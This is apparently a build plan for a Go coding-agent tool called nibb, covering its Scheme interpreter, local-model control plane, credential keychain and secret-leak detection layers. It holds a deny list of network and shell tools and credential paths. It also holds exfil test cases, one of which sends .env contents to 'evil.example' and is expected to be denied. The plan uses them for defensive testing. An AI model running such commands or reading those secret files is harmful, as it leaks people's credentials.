# nibb — Build Plan (v0, self-hosting)

Companion to [SPEC.md](SPEC.md). The spec says *what* and *why*; this says *in what order, with what proof* — and, from week 5 on, **nibb is the tool used to build nibb**.

**Constraints:** one developer, 3–6 months, Go single static binary, user-written Scheme interpreter embedded in Go, TUI via bubbletea. No code exists yet; the repo is empty.

**Control-plane model:** a local Qwen served by Ollama on `workshop` over the tailnet — no API key, no cloud dependency, no secret on the build machine until Phase 3. Details in §3.4.

**Definition of done for v0:** the four I/O edges (E1–E4) are each guarded by the mechanism the spec assigns them, the exfil scenario suite passes, the log replays a session byte-for-byte, and a developer can use nibb on a real repo with real keys bound in `bindings.toml`. Proof of the last point: nibb built most of itself.

---

## 1. Shape of the plan

Two stages:

- **Stage 0 — Bootstrap (weeks 1–4), hand-written.** The smallest nibb that can do real work on this repo: read/write files, run `go build`/`go test`/`git`, talk to the model, log everything, and refuse the obviously dangerous. Deliberately tiny, deliberately hand-tested. Ends with the first promoted binary, `nibb-stable v0.1`.
- **Stage 1+ — Self-hosted (weeks 5–24).** Every remaining phase of the spec's build order is executed as nibb sessions driving `nibb-stable`. Each phase ends by promoting a new stable. The spec's ordering is preserved; only the entry point changed.

### Deviations from the spec's build order

| Change | Why |
|---|---|
| **Bootstrap compresses spec steps 1, 2 and the unlisted loop/LLM client into one hand-written stage, with a *minimal* kernel.** | To self-host you need a working loop before you need a complete interpreter. The kernel is grown to full scope afterwards, *by nibb*, as the first dogfood task (Phase 1b). |
| **The append-only log is built on day one, not at step 10.** | Invariant 1 makes the log the source of truth and every later phase says "logged". Phase 10 then only adds the derived views (window, summaries, index) — using real logs of nibb building nibb as its corpus. |
| **A naive log-derived context window ships in bootstrap.** | Self-building sessions are long; without *some* window policy the context overflows in week 5. The policy is dumb (drop oldest tool results first) but it is derived from the log on every turn, so invariant 1 holds from the start. Full memory remains Phase 10. |
| **The `Value` struct reserves its taint field in bootstrap.** | L2 (Phase 6) is cheap if planned for and expensive if not. Reserve the field now, leave it unset. |
| **A bootstrap safety envelope replaces the not-yet-built layers.** | Using nibb before keychain/L1/redaction exist means compensating controls (§3.3) must exist first, and each is retired only when the real layer lands. |

---

## 2. Repository layout

```
nibb/
  cmd/nibb/               entrypoint only: parses flags, builds a core.Session, hands it to a front-end
  internal/
    core/                 the UI-agnostic façade: Session{Send, Events, Answer, Abort}  (B2)
    log/                  append-only JSONL, replay, event kinds        (B0)
    config/               XDG dirs, policy, bindings.toml loader        (B0/P3)
    scheme/               reader, values, env, eval/apply, prim table   (B1, grown in P1b)
    scheme/prelude/       *.scm embedded in the binary                  (B1)
    prim/                 host primitives: fs, shell, http, llm-call    (B2+)
    guard/                the apply→Prim wrapper; Decision; checkers    (B2)
    llm/                  Provider interface; Ollama native client      (B2)
    loop/                 ask → tool → feed back → ask                   (B2)
    window/               naive log-derived window (B2) → memory/ (P10)
    keychain/             encrypted store, handles, sink injection      (P3)
    binding/              binding table, E3 lookup                      (P3)
    detect/l1/            shape/entropy/prefix scanner                  (P4)
    detect/l2/            taint tags + propagation helpers              (P6)
    detect/l3/            feature classifier (build tag `nol3`)         (P8)
    jev/                  System One client; egress edge, redacted      (P5)
    plan/                 noul gate, hard triggers, Seam A loop         (P5)
    redact/               the single context-ingress controller        (P7)
    memory/               window, summaries, session index             (P10)
    frontend/plain/       line-mode front-end over core (bootstrap)     (B2)
    frontend/tui/         bubbletea front-end over core                  (P9)
    frontend/rpc/         (post-v0) JSON-RPC over stdio/socket for a GUI
  dev/                    *.scm dev tools nibb loads to build itself    (B3)
  .nibb/                  init.scm (loads dev/) and allow.toml (ADR 17) (B3)
  scripts/                promote.sh, selfcheck.sh
  test/exfil/             the exfil scenario suite (grows every phase)
  test/fakes/             fake Ollama + fake Jev servers
  test/sessions/          curated real build-session logs (from P7 on)
  tools/l3train/          offline trainer (not in the binary)
  docs/adr/               decision records
  docs/scheme.md          the language reference for nibb's Scheme subset (B1, doc-first)
  docs/friction.md        running log of where nibb-stable got in the way
  docs/manual.md          how to read the code and how to use nibb
```

---

## 3. Decisions to lock in week 1 (write each as an ADR)

### 3.1 Architecture

1. **Value representation.** Tagged struct (`Kind`, payload, `Taint`), not an interface hierarchy — taint must be a field on every value, and handles must be a first-class `Kind` that prints as `#<cred:class:id>` and can never be coerced to a string.
2. **Log format.** One JSON object per line: `{seq, ts, session, kind, payload}`. Kinds fixed up front: `user.msg`, `llm.req`, `llm.resp`, `tool.call`, `tool.result`, `guard.decision`, `egress.check`, `gate.plan`, `cred.register` (class + id only), `redact.event`, `summary`. fsync per write. Sessions live under `$XDG_DATA_HOME/nibb/sessions/`.
3. **Model tool calls are Scheme applications.** The loop turns `{name, input}` into `(name arg …)` and evaluates it through `apply`. There is exactly one Scheme→Go exit — the guard call site in `apply` — and the model's calls, the prelude's calls and the user's `.scm` all cross it.
4. **Prim metadata.** Every primitive declares `Egress`, `Irreversible`, `ArgSpec` (which positions are destination / payload / credential slots), and a JSON schema for the LLM tool list. The guard reasons over `ArgSpec`, never over prim names.
5. **Keychain crypto.** File at `$XDG_CONFIG_HOME/nibb/keychain`, XChaCha20-Poly1305, key from passphrase via argon2id. OS keyring later — not v0.
6. **Unbound egress default = deny.** `confirm` is an opt-in policy flag; the confirm prompt always names class + destination + scope and offers to write a binding row. (Spec Risk 2.)
7. **Scheme scope — written from scratch, documented first.** No interpreter exists; B1 writes one. `docs/scheme.md` is written *before* the code and is the contract: syntax, data types, special forms, builtins, error model, the primitive-table contract, and an explicit "not in nibb Scheme" list. Bootstrap kernel: `define lambda if let let* begin set! quote quasiquote cond and or`, int64/float64, strings, lists, assoc, `error`, trampolined tail calls. Full v0 (Phase 1b) adds `letrec case do`, vectors, string ports, `guard`, `define-macro` only if the prelude needs it. **Never** in v0: hygienic macros, `call/cc`, `dynamic-wind`. The doc grows with the language; a builtin without a doc entry fails the conformance suite.
8. **LLM client = a `Provider` interface, Ollama first.** `llm.Provider` exposes `Chat(ctx, req) (stream)` with messages, tool schemas and a stop reason. The bootstrap implementation speaks Ollama's **native** `/api/chat` (not the `/v1` OpenAI shim): it streams, returns `thinking` as a separate field, returns tool-call arguments as JSON objects (which map 1:1 onto ADR 3's Scheme application), and accepts `options.num_ctx` and `keep_alive`. The control plane is configured, not keyed: `config.toml` `[control] provider="ollama" url="http://workshop.example:11434" model="qwen3.8-27b-96k:latest"`. Authorization is the tailnet ACL. An OpenAI-compatible provider (for `llm-call` data-plane use) and an Anthropic Messages provider come later behind the same interface; keychain class `nibb-control` exists for a *keyed* control plane and is unused while workshop is the control plane.
9. **Context and cache discipline.** The backend context is 98,304 tokens; the window budget is **80 Ki input + 8 Ki reserved for generation**, leaving margin. The request prefix — system prompt, then tool schemas, then messages in append-only order — must be byte-stable between turns so Ollama's KV prefix cache hits (a cold 80 Ki prompt eval on the RTX 4090 costs tens of seconds; a warm one costs nothing). Window elision therefore replaces payloads *in place* (`[elided seq=N]`) and never reorders or rewrites earlier turns. Model `thinking` is logged (`llm.resp.thinking`) but never fed back into the window.
10. **Core/front-end boundary.** The core (`internal/core` and everything it imports: loop, scheme, guard, llm, window, log…) knows nothing about terminals. It exposes one façade, `core.Session`: `Send(userText)`, `Events() <-chan Event`, `Answer(promptID, reply)` for confirms and masked input, `Abort()`, `Close()`. Every user-visible thing — streamed text, thinking, tool calls, guard decisions, plan scores, confirm prompts — is an `Event`, and the event stream is the same stream the log writes, so any front-end is a log subscriber with a reply channel. Front-ends live under `internal/frontend/` (`plain` in bootstrap, `tui` in P9, `rpc` for a future GUI). Dependency direction is enforced by a CI lint: nothing outside `internal/frontend/` and `cmd/` may import `internal/frontend/...` or any `charmbracelet` package, and the core never reads the terminal directly — I/O with the user goes through `Answer`/`Events` only. A future real UI is a new package under `frontend/`, not a change to the core.
11. **Terminal stack.** bubbletea + bubbles + lipgloss, confined to `internal/frontend/tui`. (The spec's "crossterm" is a Rust crate; bubbletea owns the terminal in Go, so nothing is missing.)

### 3.2 Self-hosting discipline (compiler-style staging)

12. **Two binaries, always.** `bin/nibb` is the working-tree build. `~/.local/bin/nibb-stable` is the last promoted build. **All development sessions run `nibb-stable`; nibb never edits itself through the binary being edited.** A broken working tree can never strand you.
13. **Promotion.** `scripts/promote.sh` runs `make accept` (unit + exfil suite + structural lints) and `scripts/selfcheck.sh` (the candidate must complete a scripted session: read a file, register a dev tool, run `go test ./internal/log`, replay its own log). Only then: `nibb-stable` → `nibb-stable.prev`, candidate → `nibb-stable`, git tag `v0.N-<phase>`. Rollback is `mv`.
14. **`.nibb/init.scm` convention.** On start, nibb loads `./.nibb/init.scm` if present (after `prelude/`). This repo's `init.scm` loads `dev/*.scm`. Nothing in `dev/` bypasses the guard — that is the whole point.
15. **Friction log.** When nibb-stable gets in the way, hand-edit *and* write one line in `docs/friction.md`. That file is the backlog for the line-mode UI, the TUI (P9) and memory (P10) — real data, not guesses.
16. **Fallback is allowed and honest.** If a task is faster by hand or with another agent, do it that way and note it. The goal is a built nibb, not purity. The measure of success is the trend in friction.md, not 100% self-authorship.

### 3.3 Bootstrap safety envelope

Until the real layers exist, these compensating controls make bootstrap-era nibb safe to run *in this repo*. Each row names the phase whose promotion retires it (or keeps it as defense in depth).

| Bootstrap control | Replaces | Retired by |
|---|---|---|
| **No credential of any kind on the build machine.** The control plane (workshop) needs none; the only reachable endpoint is inside the tailnet | keychain, binding table | **P3** — the keychain exists; **P5** registers the first real credential (Jev) |
| Child processes get an allowlisted env only (`PATH HOME GOPATH GOCACHE GOFLAGS GOMODCACHE TERM LANG`) | E2 redaction of `env` output | never — defense in depth |
| No `http-request` prim registered; `llm-call` absent | binding table / E3 | **P3** — enabled with E3 in place |
| `fs-*` and `shell-exec` pinned to the repo root; absolute or `..` paths outside it ⇒ Deny | — | pin stays permanently (per-project cwd is the model) |
| Path denylist in `fs-read`: `.env*`, `*.pem`, `*.key`, `id_*`, `*.kdbx`, `~/.ssh ~/.aws ~/.config/nibb` | L1 / E2 redaction | never — defense in depth |
| Shell argv hard-trigger: `curl wget nc ssh scp rsync git push git reset --hard rm -rf` ⇒ Confirm | L1 on argv, P5 hard triggers | **P5** — folded into the hard-trigger list |
| Irreversible prims (`fs-write`, `shell-exec`) ⇒ Confirm; `fs-write` shows a diff first | — | permanent (Confirm only, no diff prompt once plan gate exists) |
| Operator rule: no secrets in this repo; never paste a secret into nibb | E4 redaction | **P7** |
| Operator rule: run bootstrap-era nibb only in this repo | everything | **P7** (first version safe on other repos with real keys) |

Known hole, accepted: `shell-exec` can still `cat` a file outside the repo. The argv trigger catches the obvious spellings; the rest is the operator rules until P7.

### 3.4 Control-plane reference: workshop's Ollama (verified 2026-09-20)

Source of truth: `infra/homelab/hosts/workshop/stacks/ollama/` (compose + Modelfile). Live facts checked against the running server:

| | |
|---|---|
| Endpoint | `http://workshop.example:11434` (100.64.0.70, tailnet-only; Docker binds the Tailscale IPv4 only) |
| APIs | native `/api/chat`, `/api/embed`, `/api/tags`, `/api/ps`; OpenAI shim at `/v1` |
| Runtime | Ollama 0.34.2 (compose pins 0.34.0 by digest — drift to note in infra) |
| Model | `qwen3.8-27b-96k:latest` = `qwen3.8:27b` (27.3B, Q4_K_M, 17.7 GB) with `num_ctx 98304`; also `qwen3.6-27b-150k:latest` |
| Serving limits | `OLLAMA_MAX_LOADED_MODELS=1`, `OLLAMA_NUM_PARALLEL=1`, `KEEP_ALIVE=30m`, KV cache q8_0 + flash attention |
| Tool calling | Works on both APIs. Native returns `message.tool_calls[].function.arguments` as an object and `message.thinking` separately; `/v1` returns `reasoning` + stringified arguments |
| Measured | ~30 tok/s generation; prompt cache hits reported (`cached_tokens`) |
| Also cached | `qwen3-embedding:0.6b` (1,024-d via `/api/embed`) and a Qwen3 reranker — relevant to the spec's *deferred* embedding index, not v0 |

Consequences for the plan:

- **One slot.** workshop serves one request at a time, shared with OpenCode/Pi/Jan. The loop must tolerate queueing (long per-request timeouts, streaming keeps the UI alive, user abort cancels the HTTP request so the slot frees). Two nibb sessions at once will serialize; that is fine for one developer.
- **Prefix stability is a performance feature** (ADR 9). Tool schemas go into the prefix once and must not change order between turns; `dev/*.scm` loads before the first message, never mid-session.
- **Thinking is data, not context.** Log it, show it dimmed in the UI, never send it back.
- **Model capability is the dogfood ceiling.** A 27B Q4 model is a competent coding assistant but not a frontier agent: tasks handed to nibb-stable must be small and well-specified, tool descriptions must be explicit, and the Seam A plan gate (P5) does more work here than it would with a frontier model. See Risk 1.
- **Swapping the control plane is a config change**, not a refactor: once P3 exists, a keyed provider (Anthropic Messages, or any OpenAI-compatible endpoint) can be the control plane via `nibb-control` if the hardest phases need it. That is a decision to make on evidence from friction.md, not up front.

---

## 4. Stage 0 — Bootstrap (weeks 1–4, hand-written)

### B0 — Skeleton + log (week 1)

- `go mod init github.com/fclaude/nibb`, Go 1.27, Makefile (`build test lint accept exfil promote`), GitHub Actions: `go test -race`, `go vet`, `staticcheck`, `govulncheck`.
- `internal/log`: writer, reader, replay iterator; session ids; monotonic `seq`.
- `internal/config`: XDG paths, policy struct, empty `bindings.toml`.
- ADRs 1–16.
- `scripts/lint-boundaries.sh`: the ADR 10 dependency lint, wired into `make lint` from day one (trivially green until B2).
- **Accept:** `nibb --version`; log write → replay round-trips 10k events; `make exfil` runs (empty suite).

### B1 — Minimal Scheme kernel (weeks 1–2)

- **`docs/scheme.md` first** (half a day): the subset's reference, per ADR 7. Every later item implements a section of it.
- Reader, printer, values with reserved `Taint`, environments, `eval` and `apply` as two fixed Go functions, trampolined tail calls, Scheme errors ⇄ Go errors.
- Primitive table `map[string]*Prim` with handler + metadata. Pure builtins: arithmetic, strings, lists, assoc, `json-parse`/`json-emit`.
- `register-tool`: name + lambda + metadata → inserts a `Prim` whose handler re-enters `apply`.
- `internal/scheme/prelude/*.scm` via `go:embed`; `load`.
- **Accept:** ~40-snippet suite (grows to ~100 in P1b), one snippet per documented form/builtin so the doc and the suite stay in step; `(loop 1000000)` without stack growth; **kernel-fixed test** — hash of the eval/apply paths and special-form table unchanged after loading arbitrary `.scm`; only the prim table grew.

### B2 — Guard, prims, loop, line UI (weeks 2–3)

- `internal/guard`: `Check(ctx, *Prim, args) Decision` at the one dispatch site. `Decision ∈ {Allow, Deny{Reason, Class}, Confirm{Prompt}}`. Deny becomes an ordinary tool result fed to the model; Confirm blocks on a `Confirmer`, which `core` implements by emitting a `confirm` event and waiting on `Answer` — the guard never knows which front-end is attached. Every decision logged.
- Checkers shipped: `MetaPolicy` (Irreversible ⇒ Confirm), `RepoPin`, `PathDenylist`, `ArgvTrigger` — the envelope rows from §3.3.
- Prims: `fs-read`, `fs-write` (with diff preview), `fs-list`, `shell-exec` (scrubbed env, cwd = repo, ctx-cancellable). **No** `http-request` yet.
- `internal/llm`: `Provider` interface + Ollama native `/api/chat` implementation — streaming, tools, `thinking` split out, `num_ctx`/`keep_alive` from config, ctx-cancellable. Tool list generated from the prim table in stable order. Smoke test against workshop is a manual `make smoke`; CI uses the fake.
- `internal/loop`: the spec's loop; stop on `end_turn`, max iterations, user abort, guard fatal.
- `internal/window`: naive policy — full transcript until the 80 Ki budget, then elide oldest `tool.result` payloads *in place* as `[elided seq=N]`, then oldest turns. Rebuilt from the log every turn; prefix byte-stable across turns (ADR 9).
- `internal/core`: the `Session` façade from ADR 10 — the loop runs in a goroutine, emits `Event`s, blocks on `Answer` for confirms.
- `internal/frontend/plain`: line mode over `core.Session` — prompt, streamed text, one-line tool cards, y/n confirms, `:replay`, `:log`. `cmd/nibb` only wires config → core → front-end.
- **Accept:** "read `internal/log/log.go` and explain it" end-to-end against workshop; `kill -9` mid-session then `nibb replay` reproduces the transcript; a session that exceeds the window budget keeps working, the elisions are visible in `:log`, and the turn after an elision still reports a sub-second `prompt_eval_ms` for the unchanged prefix (the native API does not report cached tokens; prompt-eval time is the cache signal).
- **Done 2026-09-21.** The exfil runner shipped here too, with eight bootstrap scenarios (denylist, repo pin, symlink escape, argv trigger, write confirm). The plain front-end shows the fs-write diff in the confirm prompt.

### B3 — Dev tools in Scheme + first promotion (week 4)

- **Standing command approvals (ADR 17):** the dev tools wrap `shell-exec`, which is irreversible, so without this every `go test` would prompt. `.nibb/allow.toml` (per repo), `policy.allow_commands` (global) and `a` answers (session only) give the guard a standing Allow that outranks Confirm, never Deny; every use is logged.
- `dev/go.scm`: `go-build`, `go-test` (pkg pattern), `go-vet`, `go-fmt-check`, `run-make` — composed from `shell-exec` via `register-tool`; the guard sees both the wrapper and the inner call.
- `dev/git.scm`: `git-status`, `git-diff`, `git-log`; **no** `git-commit`/`git-push` tools in v0 — the operator commits.
- `dev/repo.scm`: `grep-repo`, `find-files`, `read-adr` (pure Scheme over `fs-list`/`fs-read`).
- `.nibb/init.scm` loads the above; `load` resolves relative paths against the repository root.
- `fs-edit` (exact, unique old→new with a diff preview) — added from the first self-hosting run's friction, see below.
- `scripts/selfcheck.sh`, `scripts/promote.sh`, `docs/friction.md`, `docs/manual.md`.
- **Accept — the self-hosting test:** with `bin/nibb` as candidate, a session adds a `string-reverse` builtin to `internal/scheme` with a doc row and a conformance snippet, runs `go-test`, and gets green — every tool call visible in the log, `go-test` routed through `register-tool → apply → guard → shell-exec`. Promote.
- **Done 2026-09-21.** First run (no `fs-edit`): 28 tool calls, 15 confirms, one mangled line repaired with sed/python — correct in the end. Second run (with `fs-edit`): 10 tool calls, 4 confirms, clean 9-line diff. Promoted as `v0.1-bootstrap`.

**Milestone M0 (end of week 4): `nibb-stable v0.1-bootstrap`. From here on nibb builds nibb.**

---

## 5. Stage 1+ — Phases built with nibb (weeks 5–24)

Each phase: (a) open a session in `nibb-stable`, (b) point it at the ADR and the phase section below, (c) work in small tool-visible steps, (d) `make accept`, (e) promote. Each phase has a **With nibb** note: what nibb-stable can and cannot do at that point, and what the promotion unlocks.

### Phase 1b — Grow the kernel to full v0 scope (weeks 5–6)

- Add `letrec case do`, vectors, string ports, `guard`/conditions, `define-macro` if needed; grow the conformance suite to ~100.
- Tighten the printer, error messages with source positions, `load` relative paths.
- **With nibb:** the ideal first dogfood task — pure Go, crisp tests, needs only `fs-*` and `go-test`. Also the first two weeks of friction.md. Expect this to be slower than hand-coding; that is the point.
- **Accept:** suite green; kernel-fixed test still green; promote `v0.2-kernel`.

**Done 2026-09-21 (fallback, ADR 16 — hand-coded by an external agent, not a nibb-stable session; reviewed and fixed before commit):** `letrec` (shared frame, mutual closure bindings), `case` (`equal?` on datums), `do` (R5RS steps, Go loop = constant stack), `when`/`unless`, `guard` (R7RS shape `(guard (var clause …) body …)`, `var` bound to `((message . …) (irritants …))`; denials and cancellation are never catchable), `with-output-to-string` (minimal string port), vectors (`#(…)` reader, `vector*` builtins, `equal?`/`eq?` by identity) and block comments `#| … |#`. `define-macro` omitted — the prelude does not need it (ADR 7). Conformance suite roughly doubled (target was ~100); `docs/scheme.md` updated (reader, §2, §3, §4, §5, §9). Kernel version bumped `b1` → `b2`. **Not done (deferred to a follow-up):** source positions in *runtime* errors, characters, full string-port objects — all still listed in §9.
- **Review fixes (2026-09-21):** `(when)`/`(unless)` no longer panic; `guard` re-shaped to R7RS and made unable to catch `*Denied` or context errors; `case` compares symbols exactly; vectors are a shared `*Vector` (identity, mutation) and `vector` is a declared parameter type; an unterminated `#|` is incomplete input; `with-output-to-string` is reserved like every other form.
- **Pending:** promote `v0.2-kernel` (`make accept` is green; promotion runs `selfcheck.sh` + needs the control plane — an operator step).

### Phase 3 — Credentials: keychain, handles, binding table (weeks 7–9)

- `internal/keychain`: encrypted store; entries `{id, class, created}`; the value never leaves the package except through sink functions (`InjectHeader/InjectQuery/InjectBody`) into an outgoing request at a named position. The value is never a `scheme.Value`.
- `(credential-register "class")`: masked terminal input → keychain → `Handle`. Log gets `{class, id}` only.
- `internal/binding`: `bindings.toml` rows `[[bind]] class="…" dest="…" positions=["header:Authorization"] methods=["POST"]`; hot-reload; nibb may append a row on user confirmation.
- E3 checker: for every handle in a credential slot of an egress prim, look up `(class, host, position, method)`. Bound → Allow + `egress.check`. Unbound → Deny (default) / Confirm (policy). Never fail open.
- `http-request` prim (now registered) resolves handles at request-build time, at the bound position only. `llm-call` prim for other providers — data-plane, through E3.
- Second `llm.Provider`: OpenAI-compatible chat (also usable against workshop's `/v1`) exposed as the data-plane `llm-call` prim, credential slot in `ArgSpec`, through E3 like any egress. An Anthropic Messages provider is optional here and can wait for a real need.
- Keychain class `nibb-control` defined for a keyed control plane; unused while workshop is the control plane.
- **With nibb:** nibb-stable v0.2 writes this code. Tests use canary values, never real keys; nibb never touches the real keychain during development because the working tree's binary is not the one running. There is no real key to register at promotion — the first one arrives with Jev in P5 — so this phase is proven entirely by the exfil suite and fakes.
- **Accept — first exfil scenarios** (each asserts the decision *and* that a canary secret appears nowhere in log, context dump or stdout): bound header ⇒ Allow; other host ⇒ Deny; body instead of header ⇒ Deny; keychain unreadable without passphrase; `(display handle)` prints `#<cred:…>`. Promote `v0.3-creds`.

### Phase 4 — L1 fast path (weeks 10–11)

- `internal/detect/l1`: class catalog as a Go table (prefix/shape regexes for Anthropic, OpenAI, GitHub, AWS, Slack, PEM, JWT; windowed entropy; base64/hex structure). "Unknown-shape high-entropy" is its own class so L3 can take the residual later.
- Egress allowlist in config.
- Guard checker on E3 text args (`http-request` headers/body, `shell-exec` argv, `fs-write` outside project). Hit ∧ no binding ⇒ Deny. Scanner error/timeout ⇒ Deny.
- **With nibb:** nibb runs the false-positive sweep on its own repo and on two others via `grep-repo`/`fs-read` — a real workload for tuning. Promotion lets the operator loosen the "never paste" rule slightly for known shapes; the rule formally stays until P7.
- **Accept:** p99 < 1 ms on 64 KB; precision/recall on the curated set; FP sweep clean on SHAs/UUIDs/base64 images; exfil scenario: literal key in body to unbound host ⇒ Deny naming the class. Promote `v0.4-l1`.

**Milestone M2 (end of week 11): safe to run with real keys against bound hosts.**

### Phase 5 — Plan gate, hard trigger, Seam A (weeks 12–13)

- `internal/jev`: client for `POST https://api.typesafe.ai/v1/systemone`, model `jev-1.13.0`, tools `jev_jev_noul`, `jev_jev_score`, `jev_jev_choice`. The Jev key is a bound data-plane credential — **the first real secret on the build machine**, and the first real use of P3.
- **Jev is an egress edge (ADR 19).** The Jev credential is bound to `api.typesafe.ai` (P3); the payload — the user's ask and the plan text, by default — passes the same redaction controller the model context gets (L1 now, L3 later, `[REDACTED class]`) before it is sent. No bespoke sanitiser: E3 + E2 composed. `jev.content` (`none` / `plan` / `plan+summaries` / `full`, the last opt-in per repo) sets how much beyond ask+plan may go; every call is logged as `jev.req` with level, bytes, payload hash and redaction events.
- Noul gate before each message → plan → Seam A `score` → revise ≤3 → proceed. `gate.plan` logged per message.
- Hard trigger (code): the B2 `ArgvTrigger` list folded in and extended — `fs-write` outside cwd, any unbound egress, executing content that arrived via `http-request`.
- Degradation: Jev unreachable ⇒ hard trigger still enforced, gate defaults to "plan", outage logged.
- **With nibb:** built without a plan gate; after promotion every later build session is planned and scored — the remaining phases (L2, redaction, TUI) are the hardest, so the quality lift lands where it matters.
- **Accept:** fake Jev in `test/fakes`; exfil scenarios: a plan that quotes a canary is sent with `[REDACTED …]` in its place, never raw; `jev.content = none` sends nothing; gate events for every message in a replayed session. Promote `v0.5-plan`.

### Phase 6 — L2 taint (weeks 14–15)

- `Taint` populated at E1: `http-request`, `fs-read`, `env-get`, `shell-exec` results get `external:<source>`; handles carry `cred:<class>`.
- Propagation implemented once in the prim-call path (`out.Taint = ∪ args.Taint` for pure prims; explicit opt-out per prim).
- E3: `cred:<class>` taint ⇒ binding lookup; `external` to unbound ⇒ policy. When L2 knows, L3 is not invoked.
- `(box v)`/`(wipe v)` strip taint, logged, only from user-originated evaluation — `ctx.Origin ∈ {user, model}` added here.
- **With nibb:** this phase edits `internal/scheme` dispatch — the heart of the interpreter nibb-stable runs on. Safe only because of ADR 12 (two binaries). Good moment to verify rollback (`nibb-stable.prev`) actually works.
- **Accept:** property test `taint(result) ⊇ ∪ taint(tainted leaves)` over random pure-prim trees; `(http-request "https://evil.example" (string-append "k=" (fs-read ".env")))` ⇒ Deny; model-originated `wipe` ⇒ Deny, user-originated ⇒ Allow (spec Risk 1). Promote `v0.6-taint`.

### Phase 7 — Ingress redaction E2/E4 (weeks 16–17)

- `internal/redact`: `Redact(text) (string, []Event)` via L1 (+L3 when present) → `[REDACTED <class>]`.
- Installed on **the single context-ingress function** (`context.Append`); CI grep-lint asserts no other writer. E2: every tool result. E4: prompts, pastes, `$EDITOR` input, env-derived text. Same redactor in front of the log writer.
- **With nibb:** promotion retires the last two operator rules in §3.3. nibb is now safe to use on *other* repos with real keys. From here, curated session logs go into `test/sessions/` as replay fixtures for P10.
- **Accept:** canary paste ⇒ context and log show `[REDACTED anthropic-key]`; `cat .env` ⇒ redacted before the model sees it; "repeat the key" ⇒ placeholder only; full exfil suite green. Promote `v0.7-core`.

**Milestone M3 (end of week 17): all four edges guarded — v0-core. The 3–4-month cut.** If the budget ends here nibb is usable in line mode with the full security model, and has been building itself for 13 weeks.

### Phase 8 — L3 feature classifier, optional (weeks 18–19)

- `internal/detect/l3`: features → logistic regression, weights embedded; Platt calibration → `P(secret)`. Invoked only on the residual; combines with binding (`P > τ ∧ unbound ⇒ Confirm`); never allows or denies alone. Build tag `nol3`.
- `tools/l3train`: public secrets corpus + synthetic negatives + nibb's own confirmed events.
- **With nibb:** the confirmed-event file already has weeks of entries from the build sessions — the "own events" training set is real from day one.
- **Accept:** ECE < 0.05; < 5 ms per 4 KB; exfil suite green under both build tags. Promote `v0.8-l3`.

### Phase 9 — TUI (weeks 20–22)

- `internal/frontend/tui`: a bubbletea program over `core.Session` — no new core code; if P9 needs a core change, that is a gap in ADR 10 and gets an ADR amendment, not a shortcut.
- Views: streaming transcript; tool-call cards with guard badge; plan panel; confirm modal naming class + destination + scope with "bind this"; masked credential input; `:log :bindings :replay :friction`.
- **With nibb:** friction.md is the backlog, ranked by frequency. Line mode stays as `nibb --plain` — it is still what CI and `selfcheck.sh` use. A `frontend/rpc` for a real GUI is post-v0 but costs nothing to leave room for.
- **Accept:** every line-mode flow works in the TUI; resize; Ctrl-C mid-`shell-exec` leaves no orphan. Promote `v0.9-tui`.

### Phase 10 — Memory (weeks 23–24)

- Replace the naive window with the spec's: recent turns verbatim, older spans replaced by their latest `summary` log event; `nibb summary --drop <seq>` revokes and recomputes.
- Session index: tree-sitter symbols + ripgrep search exposed as prims (`index-symbols`, `index-grep`) — surgical pull, the model asks.
- **With nibb:** `test/sessions/` holds real logs of nibb building nibb since P7; window and summary policies are designed and tested against them, not synthetic transcripts.
- **Accept:** `nibb replay` reproduces the window byte-for-byte; dropping a summary changes the window deterministically; no cross-session state on disk except the log. Promote `v0.10` = **v0**.

---

## 6. Timeline at a glance

| Weeks | Stage / phase | Promotes | Milestone |
|---|---|---|---|
| 1–4 | **Bootstrap** B0–B3 (hand-written) | `v0.1-bootstrap` | **M0 self-hosting** |
| 5–6 | P1b Kernel growth | `v0.2-kernel` | |
| 7–9 | P3 Credentials | `v0.3-creds` | |
| 10–11 | P4 L1 | `v0.4-l1` | **M2 safe with real keys** |
| 12–13 | P5 Plan gate | `v0.5-plan` | |
| 14–15 | P6 L2 taint | `v0.6-taint` | |
| 16–17 | P7 Redaction | `v0.7-core` | **M3 v0-core (3–4 mo cut)** |
| 18–19 | P8 L3 (optional) | `v0.8-l3` | |
| 20–22 | P9 TUI | `v0.9-tui` | |
| 23–24 | P10 Memory | `v0.10` | **v0 done** |

Cut order if time runs short: P10 → P8 → P9 polish (keep `--plain`). Never cut B0–B3 or P3–P7.

---

## 7. Cross-cutting discipline

- **Exfil scenario suite (`test/exfil/`)** is the project's most important artifact: Scheme script + expected `Decision` + post-condition that a seeded canary appears in none of log, context dump, captured Jev payloads, stdout. Grows every phase; required for promotion.
- **Selfcheck (`scripts/selfcheck.sh`)** is the second gate: the candidate binary must complete a scripted session on this repo before it can become stable.
- **Structural lints in CI:** kernel-fixed hash after loading `.scm`; single context-ingress; single Scheme→Go exit (the guard call site in `apply` is the only `Prim.Handler` invocation); core/front-end boundary (ADR 10).
- **Fuzzing:** reader and L1 from day one.
- **Fakes, not mocks:** a fake Ollama (`/api/chat` streaming, scripted tool calls) and a fake Jev under `test/fakes/`. `make smoke` runs a two-turn session against real workshop and is manual, not CI.
- **friction.md** is reviewed at every promotion; the top three items are candidates for the next phase's side-work.
- **ADR per decision**; SPEC.md is amended, not contradicted.

---

## 8. Risk register

| # | Risk | Mitigation |
|---|---|---|
| 1 | **Dogfood tax, amplified by a 27B local model:** weeks 5–8 are slower than hand-coding and the model will need small, explicit tasks | Expected and bounded; fallback is allowed (ADR 16); friction.md turns the cost into the P9/P10 backlog; if evidence says the model is the bottleneck on P6/P7, switch the control plane to a keyed frontier provider via `nibb-control` (config change after P3) |
| 1b | **Single inference slot on workshop** shared with other clients; long cold prompt evals | Streaming + generous timeouts + abort frees the slot; ADR 9 keeps the prefix cache warm; `keep_alive` is 30 m so the model stays resident between turns |
| 2 | **Broken stable strands development** | ADR 12/13: two binaries, selfcheck before promotion, `nibb-stable.prev` rollback; verify rollback deliberately in P6 |
| 3 | **Bootstrap envelope hole (`shell-exec` reading outside the repo)** | Argv trigger + operator rules until P7; scrubbed child env stays forever; no secrets on the build machine's repo |
| 4 | Interpreter scope creep | ADR 7 scope freeze; bootstrap kernel is minimal by design, P1b is the only growth window |
| 5 | Taint representation chosen late | `Taint` reserved in B1; propagation implemented once in dispatch |
| 6 | Confirm loop becomes a rubber stamp (spec Risk 2) | Default Deny; confirm names class + dest + scope and offers a binding row |
| 7 | Jev latency/outage on every message | Cache noul per user message; 2 s timeout; degrade to "plan"; hard trigger independent |
